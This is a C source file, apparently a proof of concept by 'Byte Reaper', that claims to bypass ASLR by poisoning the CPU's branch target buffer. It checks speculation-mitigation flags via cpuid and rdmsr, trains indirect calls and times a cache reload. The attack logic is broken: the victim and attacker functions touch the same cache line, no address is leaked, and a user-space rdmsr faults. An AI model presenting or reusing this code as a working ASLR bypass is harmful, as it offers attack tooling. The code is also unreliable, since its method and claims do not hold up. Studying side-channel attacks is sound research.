/*
 * Author: Byte Reaper
 * Description : application jump over aslr: attacking branch predictors to bypass aslr Technique
 * run script :
 *              # gcc btb.c -o BTB
 *              # ./BTB
 */

#include <stdio.h>
#include <x86intrin.h>
#include <stdint.h>
#include <string.h>
#include <sys/types.h>
#include <unistd.h>
#include <time.h>
#define CACHE_HIT_THRESHOLD 150
#define CACHE_PAGES 256
#define PAGE_SIZE 4096
#define TARGET_PAGE 0
#define TARGET_OFFSET (TARGET_PAGE * PAGE_SIZE)
unsigned char cache[CACHE_PAGES * PAGE_SIZE];

static inline void flush(void *addr)
{
    _mm_clflush(addr);
    _mm_sfence();
}
static inline int reload(void *addr)
{
    unsigned int aux;
    uint64_t start, end;
    __asm__ volatile
    (
        "mfence\n\t"
        "lfence\n\t"
        "rdtsc\n\t"
        : "=a"(((uint32_t *)&start)[0]),
          "=d"(((uint32_t *)&start)[1])
        :
        : "rcx",
          "memory"
    );

    (void)*(volatile unsigned char *)addr;

    __asm__ volatile
    (
        "rdtscp\n\t"
        "lfence\n\t"
        : "=a"(((uint32_t *)&end)[0]),
        "=d"(((uint32_t *)&end)[1]),
        "=c"(aux)
        :
        : "memory"
    );

    return (int)(end - start);
}

void __attribute__((noinline)) victimValue()
{
    __asm__ volatile
    (
        "nop\n\t"
        :
        :
        :
    );
    volatile unsigned char tmp = cache[TARGET_OFFSET];
    (void)tmp;
}

void __attribute__((noinline)) attackerValue()
{
    __asm__ volatile
    (
        "nop\n\t"
        :
        :
        :
    );
    volatile unsigned char tmp = cache[TARGET_OFFSET];
    (void)tmp;
}
void rA(uint64_t rax,
        uint64_t rdi,
        uint64_t rsi,
        uint64_t rdx,
        const char *message1,
        const char *message2,
        const char *message3,
        const char *message4)
{
    int flag1 = 0;
    int flag2 = 0;
    int flag3 = 0;
    int flag4 = 0;
    uint64_t rip;
    __asm__ volatile
    (
        "cmp $0x0, %[message1]\n\t"
        "je .finish\n\t"
        "add $0x1, %[var]\n\t"
        ".finish:\n\t"
        : [var] "+r" (flag1)
        : [message1] "r" (message1)
        :
    );

    printf("\e[1;33m[+] Register Value : \e[0m\n");
    if (flag1 != 0)
    {
        printf("\e[1;37mRAX : 0x%lx (dec : %d) %s\e[0m\n",
               rax,
               (int)rax,
               message1);
    }
    else if (flag1 == 0)
    {
        printf("\e[1;37mRAX : 0x%lx\e[0m\n",
               rax
        );
    }
    __asm__ volatile
    (
        "cmp $0x0, %[message2]\n\t"
        "je .fI\n\t"
        "add $0x1, %[var]\n\t"
        ".fI:\n\t"
        : [var] "+r" (flag2)
        : [message2] "r" (message2)
        :
    );
    if (flag2 != 0)
    {
        printf("\e[1;37mRDI : 0x%lx (dec : %d) %s\e[0m\n",
               rdi,
               (int)rdi,
               message2);

    }
    else if (flag2 == 0)
    {
        printf("\e[1;37mRDI : 0x%lx\e[0m\n", rdi);
    }
    __asm__ volatile
    (
        "cmp $0x0, %[message3]\n\t"
        "je .fH\n\t"
        "add $0x1, %[var]\n\t"
        ".fH:\n\t"
        : [var] "+r" (flag3)
        : [message3] "r" (message3)
        :
    );
    if (flag3 != 0)
    {
        printf("\e[1;37mRSI : 0x%lx (dec : %d) %s\e[0m\n",
               rsi,
               (int)rsi,
               message3);

    }
    else if (flag3 == 0)
    {
        printf("\e[1;37mRSI : 0x%lx\e[0m\n", rsi);
    }
    __asm__ volatile
    (
        "cmp $0x0, %[message4]\n\t"
        "je .fS\n\t"
        "add $0x1, %[var]\n\t"
        ".fS:\n\t"
        : [var] "+r" (flag4)
        : [message4] "r" (message4)
        :
    );
    if (flag4 != 0)
    {
        printf("\e[1;37mRDX : 0x%lx (dec : %d) %s\e[0m\n",
               rdx,
               (int)rdx,
               message4);

    }
    else if (flag4 == 0)
    {
        printf("\e[1;37mRDX : 0x%lx\e[0m\n", rdx);
    }
    __asm__ volatile
    (
        "leaq (%%rip), %[var5]\n\t"
        :[var5] "=r" (rip)
        :
        :
    );
    printf("\e[1;37mRIP : 0x%lx\e[0m\n", rip);
    printf("\e[1;35m-----------------------------------------------\e[0m\n");

}

static void cP()
{
    printf("\e[1;37m[+] check  System Security for Check branch predictors...\e[0m\n");
    struct timespec rQ, rM;
    rQ.tv_sec=1;
    rQ.tv_nsec=500000000;
    const char *erS = "\e[1;31m[-] Error Sleep 1.5 s !\e[0m\n";
    const char *s2 = "\e[1;34m[+] Sleep Success.\e[0m\n";
    size_t len10 = strlen(erS);
    size_t len11 = strlen(s2);
    __asm__ volatile
    (
        "mov $0x23, %%rax\n\t"
        "mov %[rem], %%rsi\n\t"
        "mov %[req], %%rdi\n\t"
        "syscall\n\t"
        "cmp $0, %%rax\n\t"
        "jne .err\n\t"
        "mov $0x1, %%rdi\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[s2], %%rsi\n\t"
        "mov %[len11], %%rdx\n\t"
        "syscall\n\t"
        "jmp .doneJ\n\t"
        ".err:\n\t"
        "mov %[erS], %%rsi\n\t"
        "mov %[len10], %%rdx\n\t"
        "mov $0x1, %%rax\n\t"
        "mov $0x1, %%rdi\n\t"
        "syscall\n\t"
        ".doneJ:\n\t"
        :
        : [req] "r" (&rQ),
          [rem] "r" (&rM),
          [len11] "r" (len11),
          [s2] "r" (s2),
          [len10] "r" (len10),
          [erS] "r" (erS)
        :   "rax",
            "rdi",
            "rsi",
            "rdx"
    );
    uint32_t eax;
    uint32_t ecx;
    uint32_t ebx;
    uint32_t edx;
    int sT=0;
    int iB=0;
    int sS=0;
    int lF=0;
    eax = 0x7;
    ecx = 0x0;
    __asm__ volatile
    (
        "cpuid"
        : "=a"(eax),
          "=b"(ebx),
          "=c"(ecx),
          "=d"(edx)
        : "a"(eax),
          "c"(ecx)
    );
    if ((edx & (1U << 27))  != 0)
    {
        printf("\e[1;34m[+] Detect Single Thread Indirect Branch Predictors\e[0m\n");
        __asm__ volatile
        (
            "add $0x1, %[vaR1]\n\t"
            :[vaR1] "+r" (iB)
            :
            :
        );
    }
    else
    {
        printf("\e[1;31m[-] Not Detect Single Thread Indirect Branch Predictors.\e[0m\n");
        __asm__ volatile
        (
            "add $0x1, %[vaR]\n\t"
            :[vaR] "+r" (sT)
            :
            :
        );
    }
    if ((edx & (1U << 26))  != 0)
    {
        printf("\e[1;34m[+] Detect Indirect Branch Restricted Speculation.\e[0m\n");
        printf("[+] Detect Indirect Branch Predictor Barrier.\e[0m\n");
    }
    else
    {
        printf("\e[1;31m[-] Not Detect Indirect Branch Restricted Speculation\e[0m\n");

    }
    if ((edx & (1U << 31))  != 0)
    {
        printf("\e[1;34m[+] Detect Speculative Store Bypass Disable .\e[0m\n");
        __asm__ volatile
        (
            "add $0x1, %[vaR1]\n\t"
            :[vaR1] "+r" (sS)
            :
            :
        );
    }
    else
    {
        printf("\e[1;31m[-] Not Detect Speculative Store Bypass Disable .\e[0m\n");

    }
    if ((edx & (1U << 28)) != 0)
    {
        printf("\e[1;34m[+] Detect L1D_FLUSH.\e[0m\n");
        __asm__ volatile
        (
            "add $0x1, %[vaR1]\n\t"
            :[vaR1] "+r" (lF)
            :
            :
        );
    }
    else
    {
        printf("\e[1;31m[-] Not Detect L1D_FLUSH .\e[0m\n");
    }
    if ((edx & (1U << 10)) != 0)
    {
        printf("\e[1;34m[+] Detect MD_CLEAR.\e[0m\n");
    }
    else
    {
        printf("\e[1;31m[-] Not Detect MD_CLEAR .\e[0m\n");
    }
    eax = 0x7;
    ecx = 0x0;
    __asm__ volatile
    (
        "cpuid"
        : "=a"(eax),
          "=b"(ebx),
          "=c"(ecx),
          "=d"(edx)
        : "a"(eax),
          "c"(ecx)
    );
    if ((edx & (1U << 29)) != 0)
    {
        printf("\e[1;36m[+] Found IA32_ARCH_CAPABILITIES.\e[0m\n");
        printf("\e[1;37m[+] Check Root Access...\e[0m\n");
        const char *mes13 = "\e[1;31m[-] #GP(0) : level is not 0, please run script in root !\e[0m\n";
        const char *mes14 = "[+] Script run in root.\e[0m\n";
        size_t len13 = strlen(mes13);
        size_t len14 = strlen(mes14);
        __asm__ volatile
        (
            "mov $0x6B, %%rax\n\t"
            "syscall\n\t"
            "cmp $0x0, %%rax\n\t"
            "jne .notR\n\t"
            ".dLt:\n\t"
            "mov $0x1, %%rdi\n\t"
            "mov %[len14], %%rdx\n\t"
            "mov $0x1, %%rax\n\t"
            "mov %[mes14], %%rsi\n\t"
            "syscall\n\t"
            "jmp .fGk\n\t"
            ".notR:\n\t"
            "mov $0x1, %%rdi\n\t"
            "mov %[len13], %%rdx\n\t"
            "mov $0x1, %%rax\n\t"
            "mov %[mes13], %%rsi\n\t"
            "syscall\n\t"
            "mov $0x0, %%rdi\n\t"
            "mov $0x3C, %%rax\n\t"
            "syscall\n\t"
            ".fGk:\n\t"
            :
            :  [len14] "r"(len14),
               [mes14] "r"(mes14),
               [len13] "r"(len13),
               [mes13] "r"(mes13)
            : "rax",
              "rdi",
              "rsi",
              "rdx",
              "rcx",
              "r11"
        );
        printf("\e[1;37m[+] Check Flags IA32_ARCH_CAPABILITIES...\e[0m\n");
        uint64_t msr = 0x10A;
        uint32_t lowEax, highEdx;
        __asm__ volatile
        (
            "rdmsr"
            : "=a"(lowEax),
              "=d"(highEdx)
            : "c"(msr)
        );
        uint64_t flags  = ((uint64_t)highEdx << 32) | lowEax;
        if (flags & (1ULL << 1))
        {
            printf("\e[1;34m[+] Found Flag IBRS_ALL.\e[0m\n");
        }
        else
        {
            printf("\e[1;31m[-] Not Found Flag IBRS_ALL !\e[0m\n");
        }
        if (flags & (1ULL << 3))
        {
            printf("\e[1;34m[+] Found Flag SKIP_L1DFL_VMENTRY.\e[0m\n");
        }
        else
        {
            printf("\e[1;31m[-] Not Found Flag SKIP_L1DFL_VMENTRY !\e[0m\n");
        }
        if (flags & (1ULL << 6))
        {
            printf("\e[1;34m[+] Found Flag IF_PSCHANGE_MC_NO.\e[0m\n");
        }
        else
        {
            printf("\e[1;31m[-] Not Found Flag IF_PSCHANGE_MC_NO !\e[0m\n");
        }
        if (flags & (1ULL << 8))
        {
            printf("\e[1;34m[+] Found Flag TAA_NO.\e[0m\n");
        }
        else
        {
            printf("\e[1;31m[-] Not Found Flag TAA_NO !\e[0m\n");
        }
    }
    else
    {
        printf("\e[1;31m[-] Not Detect IA32_ARCH_CAPABILITIES.\e[0m\n");
    }

    printf("\e[1;33m[+] Result Detect Branch predictors : \e[0m\n");
    if (sT == 1 || iB == 1 || sS == 1 || lF == 1)
    {

        printf("\e[1;36m[+] Detect Branch predictors\e[0m\n");
    }
    else
    {
        printf("\e[1;31m[-] Not Detect Branch predictors, Exit...\e[0m\n");
        abort();
    }
}

int main() 
{
    printf(" \e[1;37m\t   [ Byte Reaper ]\e[0m\n");
    printf(" \e[1;37m\t[ jump over aslr BTB ]\e[0m\n");
    printf("\e[1;31m---------------------------------------------------------------------------------\e[0m\n");
    cP();
    void (*ptr1)() = NULL;
    void (*ptr2)() = NULL;
    const char *mes1 = "\e[1;31m[-] Address victimValue() is NULL, Exit...\e[0m\n";
    const char *mes2 = "\e[1;34m[+] Get Address  victimValue() function Success.\e[0m\n";
    const char *mes3 = "\e[1;31m[-] Address attackerValue() is NULL, Exit...\e[0m\n";
    const char *mes4 = "\e[1;34m[+] Get Address  attackerValue() function Success.\e[0m\n";
    const char *mes5 = "\e[1;31m[-] Error Copy Address attackerValue() in ptr2, exit...\e[0m\n";
    const char *mes6 = "\e[1;34m[+] Get pid  success.\e[0m\n";
    const char *mes7 = "\e[1;31m[-] Error Get pid, exit...\e[0m\n";
    const char *mes8 = "\e[1;34m[+] Get tid  success.\e[0m\n";
    const char *mes9 = "\e[1;31m[-] Error Get tid, exit...\e[0m\n";
    size_t len1 = strlen(mes1);
    size_t len2 = strlen(mes2);
    size_t len3 = strlen(mes3);
    size_t len4 = strlen(mes4);
    size_t len5 = strlen(mes5);
    size_t len6 = strlen(mes6);
    size_t len7 = strlen(mes7);
    size_t len8 = strlen(mes8);
    size_t len9 = strlen(mes9);
    uint64_t rax;
    uint64_t rdi;
    uint64_t rsi;
    uint64_t rdx;
    uint64_t rip;
    __asm__ volatile
    (
        "mov %[func1], %%rax\n\t"
        "test %%rax, %%rax\n\t"
        "je .nullV\n\t"
        ".done:\n\t"
        "mov %%rax, %0\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[len2], %%rdx\n\t"
        "mov %[mes2], %%rsi\n\t"
        "mov $0x1, %%rdi\n\t"
        "syscall\n\t"
        "jmp .end\n\t"
        ".nullV:\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[mes1], %%rsi\n\t"
        "mov %[len1], %%rdx\n\t"
        "mov $0x1, %%rdi\n\t"
        "syscall\n\t"
        "xor $0x0, %%rdi\n\t"
        "mov $0xE7, %%rax\n\t"
        "syscall\n\t"
        ".end:\n\t"
        : [ptr1] "=r" (ptr1)
        : [func1] "r" (victimValue),
          [mes1] "r" (mes1),
          [len1] "r" (len1),
          [mes2] "r" (mes2),
          [len2] "r" (len2)
        : "rax",
          "rdi",
          "rsi",
          "rdx",
          "rcx",
          "r11",
          "memory"
    );
    rax = 0x1;
    rdi  = 0x1;
    rsi = sizeof(mes3);
    rdx = len3;
    rA(rax, rdi,rsi, rdx,"syscall write", "arg 1 : file des", "message", "len message");
    __asm__ volatile
    (
            "xor %%rax, %%rax\n\t"
            "xor %%rdi, %%rdi\n\t"
            "xor %%rsi, %%rsi\n\t"
            "xor %%rdx, %%rdx\n\t"
            "mov %[func2], %%rax\n\t"
            "test %%rax, %%rax\n\t"
            "je .nullAddress\n\t"
            ".doN:\n\t"
            "mov %[func2], %[ptr2]\n\t"
            "cmp $0x0, %[ptr2]\n\t"
            "je .z\n\t"
            "mov %[len4], %%rdx\n\t"
            "mov %[mes4], %%rsi\n\t"
            "mov $0x1, %%rdi\n\t"
            "mov $0x1, %%rax\n\t"
            "syscall\n\t"
            "jmp .reS\n\t"
            ".nullAddress:\n\t"
            "mov $0x1, %%rdi\n\t"
            "mov $0x1, %%rax\n\t"
            "mov %[len3], %%rdx\n\t"
            "mov %[mes3], %%rsi\n\t"
            "syscall\n\t"
            "xor $0x0, %%rdi\n\t"
            "mov $0xE7, %%rax\n\t"
            "syscall\n\t"
            ".z:\n\t"
            "mov $0x1, %%rax\n\t"
            "mov %[mes5], %%rsi\n\t"
            "mov %[len5], %%rdx\n\t"
            "mov $0x1, %%rdi\n\t"
            "syscall\n\t"
            "mov $0x0, %%rdi\n\t"
            "mov $0x3C, %%rax\n\t"
            "syscall\n\t"
            ".reS:\n\t"
            :  [ptr2] "=r" (ptr2)
            :  [func2] "r" (attackerValue),
               [mes3] "r" (mes3),
               [len3] "r" (len3),
               [mes4] "r" (mes4),
               [len4] "r" (len4),
               [mes5] "r" (mes5),
               [len5] "r" (len5)
            : "rax",
              "rdi",
              "rsi",
              "rdx",
              "rcx",
              "r11",
              "memory"
    );
    pid_t pid;
    pid_t tid;
    long v;
    long g;
    rax = 0x27;
    __asm__ volatile
    (
        "syscall\n\t"
        :"=a"(v)
        :"a"(rax)
        :"rcx",
         "r11",
         "memory"
    );
    __asm__ volatile
    (
        "cmp $0x0, %[varP]\n\t"
        "je .eRPid\n\t"
        ".dPid:\n\t"
        "mov $0x1, %%rdi\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[len6], %%rdx\n\t"
        "mov %[mes6], %%rsi\n\t"
        "syscall\n\t"
        "jmp .hG\n\t"
        ".eRPid:\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[mes7], %%rsi\n\t"
        "mov %[len7], %%rdx\n\t"
        "mov $0x1, %%rdi\n\t"
        "syscall\n\t"
        "mov $0x3C, %%rax\n\t"
        "xor %%rdi, %%rdi\n\t"
        "syscall\n\t"
        ".hG:\n\t"
        :
        : [varP] "r" (v),
          [mes6] "r" (mes6),
          [len6] "r" (len6),
          [mes7] "r" (mes7),
          [len7] "r" (len7)
        : "rax",
          "rdi",
          "rsi",
          "rdx"
    );
    pid = (pid_t)v;
    rax=0xBA;
    __asm__ volatile
    (
            "syscall\n\t"
            :"=a"(g)
            :"a"(rax)
            :"rcx",
            "r11",
            "memory"
    );
    tid = (pid_t)g;
    printf("\e[1;32m[+] PID : %d\e[0m\n", (int)v);
    rax=0x3E;
    rdi = (int)v;
    rsi = 0x0;
    rdx = 0x0;
    rA(rax, rdi,rsi, rdx,"syscall kill", "arg 1 : pid", "arg 2 : sig=0", NULL);
    __asm__ volatile
    (
        "cmp $0x0, %[tidVar]\n\t"
        "je .bfGF\n\t"
        ".dJk:\n\t"
        "mov $0x1, %%rdi\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[mes8], %%rsi\n\t"
        "mov %[len8], %%rdx\n\t"
        "syscall\n\t"
        "jmp .sLF\n\t"
        ".bfGF:\n\t"
        "mov $0x1, %%rdi\n\t"
        "mov $0x1, %%rax\n\t"
        "mov %[mes9], %%rsi\n\t"
        "mov %[len9], %%rdx\n\t"
        "syscall\n\t"
        "mov %[pidV], %%rdi\n\t"
        "mov %%rax, %[varRegister]\n\t"
        "mov $0x0, %%rsi\n\t"
        "syscall\n\t"
        ".sLF:\n\t"
        :
        : [tidVar] "r" (tid),
          [mes8] "r" (mes8),
          [len8] "r" (len8),
          [mes9] "r" (mes9),
          [len9] "r" (len9),
          [pidV] "r" (v),
          [varRegister] "r" (rax)
        : "rax",
          "rdi",
          "rsi",
          "rdx"
    );
    printf("\e[1;32m[+] TID : %d\e[0m\n", (int)g);
    int t ;
    int i;
    __asm__ volatile
    (
        "mov $0x0, %[var]\n\t"
        : [var] "=r" (t)
        :
        :
    );
    __asm__ volatile
    (
        "mov $0x0, %[var]\n\t"
        : [var] "=r" (i)
        :
        :
    );
    printf("\e[1;34m[+] Attacker Value : %p\n",
           (void*)ptr2);
    printf("\e[1;34m[+] Victim Value :   %p\n",
           (void*)ptr1);
    flush(&cache[TARGET_OFFSET]);
    for (i = 0; i < 30000; i++)
    {
        (*ptr1)();
    }
    printf("\e[1;34m[+] BTB trained: 30,000 indirect CALLs to victimValue\e[0m\n");
    (*ptr2)();
    printf("\e[1;34m[+] One indirect CALL to attacker Value (mis)predict\e[0m\n");

    printf("\e[1;34m[+] Check threshold For Cache...\e[0m\n");
    t = reload(&cache[TARGET_OFFSET]);
    printf("\e[1;34m[+] Reload time: %d cycles\e[0m\n", t);

    if (t < CACHE_HIT_THRESHOLD)
    {
        printf("\e[1;36m[+] Speculative execution touched cache[0]\e[0m\n");
    }
    else
    {
        printf("\e[1;31m[-] No speculative cache access detected\e[0m\n");
    }
    rax = 0x3C;
    rdi = 0x0;
    rsi = 0x0;
    rdx = 0x0;
    rA(rax, rdi,rsi, rdx,"syscall exit", "arg 1 : 0", NULL, NULL);
    __asm__ volatile
    (
            "xor %%rdi, %%rdi\n\t"
            "mov $0x3C, %%rax\n\t"
            "syscall\n\t"
            :
            :
            :"rax", "rdi"
    );
}